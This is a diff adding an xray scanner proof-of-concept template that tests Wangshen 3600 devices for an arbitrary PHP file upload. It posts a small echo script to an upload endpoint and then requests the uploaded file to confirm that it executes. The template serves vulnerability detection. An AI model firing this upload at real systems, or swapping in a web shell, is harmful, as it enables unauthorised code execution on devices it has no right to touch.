@@ -1,0 +1,50 @@
+name: poc-yaml-wangshen-3600-objapp-upload
+# xray模板中的 body | 换行(数据太多, >-不行)， expression 可以直接空两格，或者 >- , |是不行的
+detail:
+  author: yesha
+  links:
+    - https://yesha.com
+  vulnerability:
+    level: critical  
+transport: http
+set:
+  s1: randomInt(1000000,9999999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /?g=obj_app_upfile
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+      body: |
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="upfile"; filename="{{s1}}.php"
+        Content-Type: text/plain
+
+        <?php echo "{{s1}}"?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data;name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+    expression: >-
+      response.status == 302 && response.body_string.contains("successfully
+      uploaded")
+  r1:
+    request:
+      method: GET
+      path: /attachements/{{s1}}.php
+      follow_redirects: false
+    expression: >-
+      response.body_string.contains(string(s1))
+expression: r0() && r1()
+
